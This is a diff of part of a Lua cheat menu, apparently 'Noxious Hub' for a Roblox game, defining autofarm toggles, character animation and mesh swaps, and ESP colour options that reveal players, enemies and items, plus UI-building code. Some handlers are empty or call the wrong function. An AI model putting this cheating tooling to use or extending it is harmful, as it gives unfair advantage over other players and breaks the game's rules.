+		{type = "toggle", title = "Auto Pick Up Heals", desc = "Toggles whether you want to automatically pick up and use heals while autofarming.", descHeightOverride = 28, func = function(state) 
+			autopickupheals = state
+		end},
+		{type = "toggle", title = "Auto Pick Up Extraction Items", desc = "Toggles whether you want to automatically pick up and use extraction items while autofarming.", descHeightOverride = 28, func = function(state) 
+			autopickupextractionitems = state
+		end},
+	},
+	["Animations"] = {
+		{type = "separator", text = "┌  Target"},
+		{type = "inputbox", title = "Target Toon", desc = "The Toon in which you will play\nanimations from.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			function capname(name)
+				noxious["toons"] = {
+					"Blot", "Flyte", "Yatta", "Bassie", "Cocoa", "Eggson", "Bobette", "Coal", "Rudie", "Ginger", "Boxten", "Brightney", "Cosmo",
+					"Connie", "Finn", "Flutter", "Gigi", "Glisten", "Goob", "Poppy", "Rodger", "Scraps", "Shrimpo", "Teagan",
+					"Tisha", "Toodles", "Sprout", "Vee", "Dandy", "Shelly", "Pebble", "Astro", "Looey"
+				}
+
+				if not name or typeof(name) ~= "string" or #name == 0 then
+					notify("Invalid Toon name.", 5, "error")
+					return nil
+				end
+
+				name = name:match("^%s*(.-)%s*$")
+				local lowered = name:lower()
+
+				if lowered == "rnd" or lowered == "razzleanddazzle" or lowered == "razzledazzle" then
+					notify("Chosen Toon: Razzle & Dazzle", 5)
+					return "RazzleDazzle"
+				end
+
+				local capped = name:sub(1, 1):upper() .. name:sub(2):lower()
+
+				for _, toonName in ipairs(noxious["toons"]) do
+					if typeof(toonName) == "string" and toonName:lower() == capped:lower() then
+						notify("Chosen Toon: " .. toonName, 5)
+						return toonName
+					end
+				end
+
+				notify("Unknown Toon name: " .. capped, 5, "error")
+				return nil
+			end
+
+			targettoonanimations = capname(text)
+		end},
+		{type = "toggle", title = "Use Twisted?", desc = "Toggles whether you want to play the animations of the Twisted version of the selected Toon.", descHeightOverride = 28, func = function(state) 
+			usetwistedanimations = state
+			animmodenotif()
+		end},
+		{type = "toggle", title = "Use Old?", desc = "Toggles whether you want to play the old animations of the selected Toon.", descHeightOverride = 28, func = function(state) 
+			useoldanimations = state
+			animmodenotif()
+		end},
+
+		{type = "separator", text = "┌  Animations"},
+		{type = "label", text = "Some animations are unavailable. More\nanimations will be added in future updates.\n(Sometimes silent)", addheight = 52, labeltype = "warning"},
+		{type = "button", title = "Apply Animation Pack", desc = "Applies the selected Toon's animations on your character.", descHeightOverride = 28, func = function() 
+			if not usetwistedanimations then 
+				if useoldanimations then 
+					applyanimpack("O" .. targettoonanimations) 
+				else 
+					applyanimpack(targettoonanimations)
+				end 
+			else
+				if useoldanimations then 
+					applyanimpack("OT" .. targettoonanimations) 
+				else 
+					applyanimpack("T" .. targettoonanimations)
+				end 
+			end
+		end},
+		{type = "button", title = "Idle Animation", desc = "Plays the selected Toon's idle animation on your character.", descHeightOverride = 28, func = function() 
+			if not usetwistedanimations then
+				if useoldanimations then
+					playanim("oldnormalidle") 
+				else
+					playanim("normalidle")
+				end
+			else 
+				if useoldanimations then
+					playanim("oldtwistedidle") 
+				else
+					playanim("twistedidle")
+				end
+			end
+		end},
+		{type = "button", title = "Walking Animation", desc = "Plays the selected Toon's walking animation \non your character.", descHeightOverride = 28, func = function() 
+			if not usetwistedanimations then
+				if useoldanimations then
+					playanim("oldnormalwalking") 
+				else
+					playanim("normalwalking")
+				end
+			else 
+				if useoldanimations then
+					playanim("oldtwistedwalking") 
+				else
+					playanim("twistedwalking")
+				end
+			end
+		end},
+		{type = "button", title = "Running Animation", desc = "Plays the selected Toon's running animation \non your character if it has one.", descHeightOverride = 28, func = function() 
+			if not usetwistedanimations then
+				if useoldanimations then
+					playanim("oldnormalrunning") 
+				else
+					playanim("normalrunning")
+				end
+			else 
+				if useoldanimations then
+					playanim("oldtwistedrunning") 
+				else
+					playanim("twistedrunning")
+				end
+			end
+		end},
+		{type = "button", title = "Extracting Animation", desc = "Plays the selected Toon's extracting animation \non your character.", descHeightOverride = 28, func = function() 
+			if useoldanimations then
+				playanim("oldextracting") 
+			else
+				playanim("extracting")
+			end
+		end},
+		{type = "button", title = "Ability Animation", desc = "Plays the selected Toon's ability animation \non your character.", descHeightOverride = 28, func = function() 
+			if not usetwistedanimations then
+				if useoldanimations then
+					playanim("oldnormalability") 
+				else
+					playanim("normalability")
+				end
+			else 
+				if useoldanimations then
+					playanim("oldtwistedability") 
+				else
+					playanim("twistedability")
+				end
+			end
+		end},
+		{type = "button", title = "Quirk Animation", desc = "Plays the selected Toon's quirk animation on \nyour character if it has one.", descHeightOverride = 28, func = function() 
+			playanim("quirk1")
+		end},
+		{type = "button", title = "Lost Interest Animation", desc = "Plays the selected Twisted's lost interest\nanimation on your character.", descHeightOverride = 28, func = function() 
+			playanim("lostinterest")
+		end},
+		{type = "button", title = "Attack Animation", desc = "Plays the selected Twisted's attack animation on\nyour character.", descHeightOverride = 28, func = function() 
+			playanim("attacking")
+		end},
+		{type = "button", title = "Extra1 Animation", desc = "Plays the selected Twisted's extra1 animation on\nyour character if it has one.", descHeightOverride = 28, func = function() 
+			if not usetwistedanimations then
+				playanim("quirk2")
+			else 
+				playanim("extra1")
+			end
+		end},
+		{type = "button", title = "Extra2 Animation", desc = "Plays the selected Twisted's extra2 animation on\nyour character if it has one.", descHeightOverride = 28, func = function() 
+			if not usetwistedanimations then
+				playanim("quirk3")
+			else 
+				playanim("extra2")
+			end
+		end},
+		{type = "button", title = "Extra3 Animation", desc = "Plays the selected Twisted's extra3 animation on\nyour character if it has one.", descHeightOverride = 28, func = function() 
+			playanim("extra3")
+		end},
+
+		{type = "separator", text = "┌  Settings"},
+		{type = "toggle", title = "Animation Looped?", desc = "Toggles whether you want the animation to loop\nonto your character.", descHeightOverride = 28, func = function(state) 
+			animationlooped = state
+			for _, track in ipairs(noxious["humanoid"]:GetPlayingAnimationTracks()) do
+				track.Looped = state
+			end
+		end},
+		{type = "inputbox", title = "Animation Speed", desc = "Sets the speed of your current\nanimation.", descHeightOverride = 28, placeholer = "Input", default = 1, func = function(text)
+			local speed = tonumber(text)
+			animationspeedinput = speed
+			for _, track in ipairs(noxious["humanoid"]:GetPlayingAnimationTracks()) do
+				track:AdjustSpeed(text)
+			end
+		end},
+		{type = "button", title = "Reset Animations", desc = "Resets your animations.", descHeightOverride = 14, func = function() 
+			resetanims()
+		end},
+	},
+	["Toon Customization"] = {
+		{type = "separator", text = "┌  Character"},
+		{type = "inputbox", title = "Dialogue Sound ID", desc = "Changes your character's dialogue \nsound to the inputted ID.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh(text)
+		end},
+
+		{type = "separator", text = "┌  Body Parts"},
+		{type = "inputbox", title = "Head Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's head.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("Head", text)
+		end},
+		{type = "inputbox", title = "Torso Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's torso.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("Body", text)
+		end},
+		{type = "inputbox", title = "Left Arm Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's left arm.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("ArmL", text)
+		end},
+		{type = "inputbox", title = "Left Lower Arm Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's left lower arm.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("ArmL2", text)	
+		end},
+		{type = "inputbox", title = "Left Hand Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's left hand.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("HandL", text)	
+		end},
+		{type = "inputbox", title = "Right Arm Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's right arm.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("ArmR", text)	
+		end},
+		{type = "inputbox", title = "Right Lower Arm Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's right lower arm.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("ArmR2", text)	
+		end},
+		{type = "inputbox", title = "Right Hand Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's right hand.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("HandR", text)	
+		end},
+		{type = "inputbox", title = "Left Leg Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's left leg.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("LegL", text)		
+		end},
+		{type = "inputbox", title = "Left Lower Leg Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's left lower leg.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("LegL2", text)		
+		end},
+		{type = "inputbox", title = "Right Leg Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's right leg.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("LegR", text)		
+		end},
+		{type = "inputbox", title = "Right Lower Leg Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's right lower leg.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("LegR2", text)		
+		end},
+		{type = "inputbox", title = "Head Accessory Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's head accessory.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changemesh("Hair", text)	
+		end},
+		{type = "inputbox", title = "Body Accessory Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's body accessory.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+		end},
+		{type = "inputbox", title = "Waist Accessory Mesh ID", desc = "Applies the inputted mesh ID onto \nyour character's waist accessory.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+		end},
+		{type = "separator", text = "┌  Textures"},
+		{type = "inputbox", title = "Whole Body Texture ID", desc = "Applies the inputted texture ID \nonto your character.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("Hair", text)	
+			changetexture("LegR2", text)		
+			changetexture("LegR", text)		
+			changetexture("LegL2", text)		
+			changetexture("LegL", text)		
+			changetexture("HandR", text)	
+			changetexture("ArmR2", text)	
+			changetexture("ArmR", text)	
+			changetexture("HandL", text)	
+			changetexture("ArmL2", text)	
+			changetexture("ArmL", text)
+			changetexture("Body", text)
+			changetexture("Head", text)
+		end},
+		{type = "inputbox", title = "Head Texture ID", desc = "Applies the inputted texture ID \nonto your character's head.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("Head", text)
+		end},
+		{type = "inputbox", title = "Torso Texture ID", desc = "Applies the inputted texture ID \nonto your character's torso.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("Body", text)
+		end},
+		{type = "inputbox", title = "Left Arm Texture ID", desc = "Applies the inputted texture ID \nonto your character's left arm.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("ArmL", text)
+		end},
+		{type = "inputbox", title = "Left Lower Arm Texture ID", desc = "Applies the inputted texture ID \nonto your character's left lower \narm.", descHeightOverride = 42, placeholer = "Input", func = function(text)
+			changetexture("ArmL2", text)
+		end},
+		{type = "inputbox", title = "Left Hand Texture ID", desc = "Applies the inputted texture ID \nonto your character's left hand.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("HandL", text)
+		end},
+		{type = "inputbox", title = "Right Arm Texture ID", desc = "Applies the inputted texture ID \nonto your character's right arm.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("ArmR", text)
+		end},
+		{type = "inputbox", title = "Right Lower Arm Texture ID", desc = "Applies the inputted texture ID \nonto your character's right lower \narm.", descHeightOverride = 42, placeholer = "Input", func = function(text)
+			changetexture("ArmR2", text)
+		end},
+		{type = "inputbox", title = "Right Hand Texture ID", desc = "Applies the inputted texture ID \nonto your character's right hand.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("HandR", text)
+		end},
+		{type = "inputbox", title = "Left Leg Texture ID", desc = "Applies the inputted texture ID \nonto your character's left leg.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("LegL", text)
+		end},
+		{type = "inputbox", title = "Left Lower Leg Texture ID", desc = "Applies the inputted texture ID \nonto your character's left lower \nleg.", descHeightOverride = 42, placeholer = "Input", func = function(text)
+			changetexture("legL2", text)
+		end},
+		{type = "inputbox", title = "Right Leg Texture ID", desc = "Applies the inputted texture ID \nonto your character's right leg.", descHeightOverride = 28, placeholer = "Input", func = function(text)
+			changetexture("LegR", text)
+		end},
+		{type = "inputbox", title = "Right Lower Leg Texture ID", desc = "Applies the inputted texture ID \nonto your character's right lower \nleg.", descHeightOverride = 42, placeholer = "Input", func = function(text)
+			changetexture("LegR2", text)
+		end},
+		{type = "inputbox", title = "Head Accessory Texture ID", desc = "Applies the inputted texture ID \nonto your character's head \naccessory.", descHeightOverride = 42, placeholer = "Input", func = function(text)
+			changetexture("Hair", text)
+		end},
+		{type = "inputbox", title = "Body Accessory Texture ID", desc = "Applies the inputted texture ID \nonto your character's body \naccessory.", descHeightOverride = 42, placeholer = "Input", func = function(text)
+
+		end},
+		{type = "inputbox", title = "Waist Accessory Texture ID", desc = "Applies the inputted texture ID \nonto your character's waist \naccessory.", descHeightOverride = 42, placeholer = "Input", func = function(text)
+
+		end},
+	},
+	["Configuration"] = {
+		{type = "separator", text = "┌  Configurations"},
+		{type = "toggle", title = "Toggle Bot-Like Messages", desc = "Toggles whether you want to sound like a bot for the chat guiding.", descHeightOverride = 28, func = function(state)
+			botlikemessages = state
+		end},		
+		{type = "toggle", title = "Advanced Auto Use Items", desc = "Toggles whether you want to automatically use\nitems when necessary.", descHeightOverride = 28, func = function(state)
+			advancedautouseitems = state
+		end},
+		{type = "toggle", title = "Toggle Loop Run Speed Modifier", desc = "Toggles whether you want the 'enablelooprunspeed' \ncommand to explicitly lock onto your run speed.", descHeightOverride = 28, func = function(state)
+			modifylooprunspeed = state
+		end},
+
+		{type = "separator", text = "┌  Blacklists"},
+		{type = "checkboxes", title = "Item Aura Blacklist", desc = "Blacklists the checked items from the item aura.", descHeightOverride = 14, shaveheight = -7,
+			boxes = { "Air Horn", "Bandage", "Bonbon", "Bottle Of Pop", "Box Of Chocolates", "Chocolate", "Eject Button", "Ext. Speed Candy", "Fake Capsule", "Gumballs", "Health Kit", "Jawbreaker", "Jumper Cable", "Pop", "Protein Bar", "Research Capsule", "Skill Check Candy", "Smoke Bomb", "Speed Candy", "Stamina Candy", "Stealth Candy", "Tape" },
+			func = function(box, state) 
+			end},
+		{type = "checkboxes", title = "Buy Aura Blacklist", desc = "Blacklists the checked items from the buy aura.", descHeightOverride = 14, shaveheight = -10,
+			boxes = { "Air Horn", "Bandage", "Bottle Of Pop", "Box Of Chocolates", "Chocolate", "Eject Button", "Ext. Speed Candy", "Gumballs", "Health Kit", "Instructions", "Jawbreaker", "Jumper Cable", "Pop", "Protein Bar", "Skill Check Candy", "Smoke Bomb", "Speed Candy", "Stamina Candy", "Stealth Candy", "Valve" },
+			func = function(box, state) 
+			end},
+		{type = "checkboxes", title = "Twisted Research Blacklist", desc = "Avoids getting research for only the selected Twisteds.", descHeightOverride = 14, shaveheight = 11,
+			boxes = { "Astro", "Bassie", "Blot", "Bobette", "Boxten", "Brightney", "Coal", "Cocoa", "Connie", "Cosmo", "Dandy", "Eggson", "Finn", "Flyte", "Gigi", "Ginger", "Glisten", "Goob", "Looey", "Pebble", "Poppy", "Razzle & Dazzle", "Rodger", "Rudie", "Scraps", "Shelly", "Shrimpo", "Sprout", "Teagan", "Tisha", "Toodles", "Vee", "Yatta" },
+			func = function(box, state) 
+			end},
+
+		{type = "separator", text = "┌  ESP Colors"},
+		{type = "inputbox", title = "Player ESP", desc = "Sets the ESP color for players.", descHeightOverride = 14, placeholer = "Input", func = function(color)
+			espcolors.players = color
+			playersespcolor = color
+			if playeresp then
+				execcmd("dpesp")
+				task.wait()
+				execcmd("epesp")
+			end
+		end},
+		{type = "inputbox", title = "Twisted ESP", desc = "Sets the ESP color for Twisteds.", descHeightOverride = 14, placeholer = "Input", func = function(color)
+			espcolors.twisteds = color
+			twistedsespcolor = color
+			if twistedesp then
+				execcmd("dtesp")
+				task.wait()
+				execcmd("etesp")
+			end
+		end},
+		{type = "inputbox", title = "Item ESP", desc = "Sets the ESP color for items.", descHeightOverride = 14, placeholer = "Input", func = function(color)
+			espcolors.items = color
+			itemsespcolor = color
+			if itemesp then
+				execcmd("diesp")
+				task.wait()
+				execcmd("eiesp")
+			end
+		end},
+		{type = "inputbox", title = "Rare Item ESP", desc = "Sets the ESP color for rare items.", descHeightOverride = 14, placeholer = "Input", func = function(color)
+			espcolors.rareitems = color
+			rareitemsespcolor = color
+			if itemesp then
+				execcmd("diesp")
+				task.wait()
+				execcmd("eiesp")
+			end
+		end},
+		{type = "inputbox", title = "Super Rare Item ESP", desc = "Sets the ESP color for super rare\nitems.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.superrareitems = color
+			superrareitemsespcolor = color
+			if itemesp then
+				execcmd("diesp")
+				task.wait()
+				execcmd("eiesp")
+			end
+		end},
+		{type = "inputbox", title = "Fake Capsule ESP", desc = "Sets the ESP color for fake\ncapsules.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.fakecapsules = color
+			fakecapsulesespcolor = color
+			if itemesp then
+				execcmd("diesp")
+				task.wait()
+				execcmd("eiesp")
+			end
+		end},
+		{type = "inputbox", title = "Machine ESP", desc = "Sets the ESP color for machines.", descHeightOverride = 14, placeholer = "Input", func = function(color)
+			espcolors.machines = color
+			machinesespcolor = color
+			if machineesp then
+				execcmd("dmesp")
+				task.wait()
+				execcmd("emesp")
+			end
+		end},
+		{type = "inputbox", title = "Completed Machine ESP", desc = "Sets the ESP color for completed \nmachines.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.completedmachines = color
+			completedmachinesespcolor = color
+			if machineesp then
+				execcmd("dmesp")
+				task.wait()
+				execcmd("emesp")
+			end
+		end},
+		{type = "inputbox", title = "Posessed Machine ESP", desc = "Sets the ESP color for posessed \nmachines.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.posessedmachines = color
+			posessedmachinesespcolor = color
+			if machineesp then
+				execcmd("dmesp")
+				task.wait()
+				execcmd("emesp")
+			end
+		end},
+		{type = "inputbox", title = "Extracted Machine ESP", desc = "Sets the ESP color for extracted\nmachines.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.machinesbeingextractedespcolor = color
+			machinesbeingextractedespcolor = color
+			if machineesp then
+				execcmd("dmesp")
+				task.wait()
+				execcmd("emesp")
+			end
+		end},
+		{type = "inputbox", title = "Elevator ESP", desc = "Sets the ESP color for the \nelevator.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.elevator = color
+			elevatorespcolor = color
+			if elevatoresp then
+				execcmd("deesp")
+				task.wait()
+				execcmd("eeesp")
+			end
+		end},
+		{type = "inputbox", title = "Fake Elevator ESP", desc = "Sets the ESP color for fake\nelevator.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.fakeelevator = color
+			fakeelevatorespcolor = color
+			if fakeelevatoresp then
+				execcmd("dfeesp")
+				task.wait()
+				execcmd("efeesp")
+			end
+		end},
+		{type = "inputbox", title = "Tendrils ESP", desc = "Sets the ESP color for sprout's\ntendrils.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.tendrils = color
+			tendrilsespcolor = color
+			if tendrilesp then
+				execcmd("dstesp")
+				task.wait()
+				execcmd("estesp")
+			end
+		end},
+		{type = "inputbox", title = "Blot's Hands ESP", desc = "Sets the ESP color for blot's\nhands.", descHeightOverride = 28, placeholer = "Input", func = function(color)
+			espcolors.blotshands = color
+			blotshandsespcolor = color
+			if blothandsesp then
+				execcmd("dbhesp")
+				task.wait()
+				execcmd("ebhesp")
+			end
+		end},
+	},
+	["Settings"] = {
+		{type = "separator", text = "┌  Script"},
+		{type = "label", text = "Loading in the script too quickly or before the\ngame loads may lead to your settings and\nconfigurations resetting back to default. We\nare working on a fix for this.", addheight = 64, labeltype = "error"},
+		{type = "button", title = "Reset To Default", desc = "Restores the default settings and configurations for\nthe script.", descHeightOverride = 28, func = function() 
+		end},
+		{type = "toggle", title = "Toggle Script Logging", desc = "Toggles whether you want to be logged in the\nDiscord server. If this option is off, other people\nusing Noxious Hub wont be able to join your\nserver.", descHeightOverride = 56, func = function(state)
+			logexecution = state
+		end},
+		{type = "toggle", title = "Toggle Command Search", desc = "Toggles whether you want the command bar to \nact as a search bar for commands.", descHeightOverride = 28, func = function(state)
+			autosearchcommand = state
+		end},
+		{type = "inputbox", title = "Toggle Keybind", desc = "Sets the keybind to toggle the\nvisibility of the interface.", descHeightOverride = 28, placeholer = "Input", func = function(key)
+			togglekeybind = key
+		end},
+		{type = "label", text = "Language switching will be available in the\nfuture.", addheight = 36, labeltype = "warning"},
+		{type = "inputbox", title = "Change Language", desc = "Changes the language used for\nthe script. Available languages:\nPortuguese, Spanish, Russian,\n???ified, Estonian", descHeightOverride = 70, placeholer = "Input", func = function(lang)
+			function capname(name)
+				noxious["languages"] = { "Portuguese", "Spanish", "Russian", "OwOified" }
+
+				name = name:match("^%s*(.-)%s*$")
+				local capped = name:sub(1, 1):upper() .. name:sub(2):lower()
+
+				for _, language in ipairs(noxious["languages"]) do
+					if typeof(language) == "string" and language:lower() == capped:lower() then
+						-- notify("Chosen language: " .. language, 5)
+						return language
+					end
+				end
+
+				if noxious["loaded"] then notify("Unknown available language: " .. capped, 5, "error") end
+				return nil
+			end
+		end},
+		{type = "toggle", title = "Clear On FocusLost", desc = "Toggles the text clearing for when you click on the command bar.", descHeightOverride = 28, func = function(state) 
+			ptcleartextbox = state
+			updclrtxt()
+		end},
+		{type = "toggle", title = "Toggle Legacy ESP", desc = "Toggles whether you want to use box adornments instead of highlights for the ESP. (Ugly)", descHeightOverride = 28, func = function(state) 
+			spawn(removeesp)
+			task.wait(1)
+			local anyEnabled = false
+			for _, enabled in pairs(noxious["esp types"]) do
+				if enabled then
+					anyEnabled = true
+					break
+				end
+			end
+
+			if anyEnabled then
+				if esplooprunning then
+					stopesploop()
+				end
+				legacyhighlights = state
+				startesploop()
+			end
+		end},
+		{type = "toggle", title = "Clearer ESP Text", desc = "Minimizes the amount of text for the ESP.", descHeightOverride = 14, func = function(state) 
+			cleareresptext = state
+			local anyEnabled = false
+			for _, enabled in pairs(noxious["esp types"]) do
+				if enabled then
+					anyEnabled = true
+					break
+				end
+			end
+			if anyEnabled then
+				spawn(removeesp)
+				startesploop()
+			end
+		end},
+	},
+}
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function fetchchecked(checkboxes)
+	local foundfirstelement = nil
+
+	for listname, buttonlist in pairs(noxious["button lists"] or {}) do
+		for _, element in ipairs(buttonlist) do
+			if element.type == "checkboxes" and element.title == checkboxes then
+				foundfirstelement = element
+				break
+			end
+		end
+		if foundfirstelement then break end
+	end
+
+	if not foundfirstelement then return {} end
+
+	local checkedboxes = {}
+	for boxname, isChecked in pairs(foundfirstelement.boxStates or {}) do
+		if isChecked then
+			table.insert(checkedboxes, boxname)
+		end
+	end
+
+	ndebug("┌ Checked boxes for '" .. checkboxes .. "':")
+	if #checkedboxes == 0 then
+		ndebug("│  None")
+	else
+		for i, boxname in ipairs(checkedboxes) do
+			ndebug("│  [" .. i .. "] " .. boxname)
+		end
+	end
+	ndebug("└───────────────────────────────────────────")
+
+	return checkedboxes
+end
+
+function fetchcheckboxes()
+	local allChecked = {}
+
+	local checkboxElements = {}
+	for listName, buttonList in pairs(noxious["button lists"] or {}) do
+		for _, element in ipairs(buttonList) do
+			if element.type == "checkboxes" then
+				table.insert(checkboxElements, {
+					list = listName,
+					title = element.title,
+					element = element
+				})
+			end
+		end
+	end
+
+	for _, cb in ipairs(checkboxElements) do
+		local groupKey = cb.list.." → "..cb.title
+		allChecked[groupKey] = {}
+
+		for boxName, isChecked in pairs(cb.element.boxStates or {}) do
+			if isChecked then
+				table.insert(allChecked[groupKey], boxName)
+			end
+		end
+	end
+
+	ndebug("┌ Checkboxes:")
+	if next(allChecked) == nil then
+		ndebug("│  No checkboxes found in any list.")
+	else
+		for groupName, boxes in pairs(allChecked) do
+			ndebug("│  "..groupName..":")
+			if #boxes == 0 then
+				ndebug("│    None")
+			else
+				for i, boxName in ipairs(boxes) do
+					ndebug("│    ["..i.."] "..boxName)
+				end
+			end
+		end
+	end
+	ndebug("└───────────────────────────────────────────")
+
+	return allChecked
+end
+
+function fetchtoggles()
+	local allToggles = {}
+
+	for listName, buttonList in pairs(noxious["button lists"] or {}) do
+		for _, element in ipairs(buttonList) do
+			if element.type == "toggle" then
+				allToggles[listName.." → "..element.title] = element.state or false
+			end
+		end
+	end
+
+	ndebug("┌ Toggles:")
+	if next(allToggles) == nil then
+		ndebug("│  No toggles found in any list.")
+	else
+		for toggleName, state in pairs(allToggles) do
+			ndebug("│  "..toggleName..": "..(state and "ON" or "OFF"))
+		end
+	end
+	ndebug("└───────────────────────────────────────────")
+
+	return allToggles
+end
+
+function fetchinputs()
+	local allInputs = {}
+
+	for listName, buttonList in pairs(noxious["button lists"] or {}) do
+		for _, element in ipairs(buttonList) do
+			if element.type == "inputbox" then
+				allInputs[listName.." → "..element.title] = element.lastInput or ""
+			end
+		end
+	end
+
+	ndebug("┌ Inputs:")
+	if next(allInputs) == nil then
+		ndebug("│  No input boxes found in any list.")
+	else
+		for inputName, value in pairs(allInputs) do
+			ndebug("│  "..inputName..": "..tostring(value))
+		end
+	end
+	ndebug("└───────────────────────────────────────────")
+
+	return allInputs
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+if not noxious["in studio"] then
+	loadnoxioussettings()
+	initializenoxioussettings()
+	syncespcolors()
+	print("[Noxious Hub]: File config load attempt #2")
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["container button height"] = 50
+noxious["container seperator height"] = 20
+noxious["container vertical spacing"] = 10
+noxious["container element width"] = 120
+
+function createframe(parent, size, isbutton)
+	local frame = Instance.new("Frame")
+	if isbutton then frame = Instance.new("TextButton") frame.Text = "" end
+	frame.Size = size
+	frame.BackgroundColor3 = noxious["default black color"]
+	frame.BorderColor3 = noxious["default white color"]
+	frame.ZIndex = 3
+	frame.Parent = parent
+	return frame
+end
+
+function dispbuttons(buttonList)	
+	noxious["saved settings"] = noxious["saved settings"] or {}
+	noxious["saved settings"][noxious["current list"]] = noxious["saved settings"][noxious["current list"]] or {}
+
+	local function isValidAudioId(text)
+		text = text:gsub("rbxassetid://", "")
+		return text:match("^%d+$") ~= nil
+	end
+
+	local function processAudioId(text)
+		return text:gsub("rbxassetid://", "")
+	end
+
+	noxious["scroll bar holder 2"].Visible = true
+	for _, child in ipairs(mainframe:GetChildren()) do
+		if child:IsA"Frame" and (child.Name == "ButtonContainer" or child.Name == "CommandContainer") then
+			child:Destroy()
+		elseif child:IsA"TextLabel" and child.Name == "Introduction" then
+			child:Destroy()
+		elseif child:IsA"ScrollingFrame" and child.Name == "CommandScrollFrame" or child.Name == "ButtonContainer" then
+			child:Destroy()
+		end
+	end
+
+	if not buttonList or type(buttonList) ~= "table" or #buttonList == 0 then
+		warn("Invalid button list provided")
+		return
+	end
+
+	noxious["button container"] = Instance.new("ScrollingFrame")
+	noxious["button container"].Name = "ButtonContainer"
+	noxious["button container"].Size = UDim2.new(0, 333, 0, 204)
+	noxious["button container"].Position = UDim2.new(1, -333, 0, 50)
+	noxious["button container"].BackgroundTransparency = 1
+	noxious["button container"].BorderSizePixel = 0
+	noxious["button container"].ScrollBarThickness = 10
+	noxious["button container"].CanvasSize = UDim2.new(0, 0, 0, 0)
+	noxious["button container"].ZIndex = 3
+	noxious["button container"].AutomaticCanvasSize = Enum.AutomaticSize.Y
+	noxious["button container"].Parent = mainframe
+	noxious["button container"].ScrollingDirection = Enum.ScrollingDirection.Y
+
+	local layout = Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, noxious["container vertical spacing"])
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = noxious["button container"]
+
+	local padding = Instance.new("UIPadding")
+	padding.PaddingTop = UDim.new(0, 5)
+	padding.PaddingLeft = UDim.new(0, 8)
+	padding.PaddingRight = UDim.new(0, 5)
+	padding.Parent = noxious["button container"]
+
+	local TextService = game:GetService("TextService")
+
+	local function getTextHeight(text, width, fontSize, font)
+		font = font or Enum.Font.Nunito
+		local size = TextService:GetTextSize(text, fontSize, font, Vector2.new(width, math.huge))
+		return size.Y
+	end
+
+	local topspacer = Instance.new("Frame")
+	topspacer.Size = UDim2.new(1, 0, 0, -5)
+	topspacer.BackgroundTransparency = 1
+	topspacer.Name = "topspacer"
+	topspacer.ZIndex = 1
+	topspacer.Parent = noxious["button container"]
+
+	for _, element in ipairs(buttonList) do
+		if element.type == "separator" then
+			local separator = Instance.new("TextLabel")
+			separator.Size = UDim2.new(1, -10, 0, noxious["container seperator height"])
+			separator.BackgroundTransparency = 1
+			separator.TextColor3 = noxious["default white color"]
+			separator.Text = " "..element.text
+			separator.TextXAlignment = Enum.TextXAlignment.Left
+			separator.Font = Enum.Font.Nunito
+			separator.TextSize = 18
+			separator.ZIndex = 3
+			separator.Parent = noxious["button container"]
+
+		elseif element.type == "label" then
+			local labeltype = element.labeltype
+			local label = Instance.new("TextLabel")
+			label.Size = UDim2.new(1, -14, 0, noxious["container seperator height"] + element.addheight)
+			label.BackgroundTransparency = 0
+			label.BackgroundColor3 = noxious["default black color"]
+			label.Text = element.text
+			label.TextXAlignment = Enum.TextXAlignment.Left
+			label.Font = Enum.Font.Nunito
+			label.TextSize = 16
+			label.ZIndex = 3
+			label.Parent = noxious["button container"]
+
+			local lol = Instance.new("UIPadding")
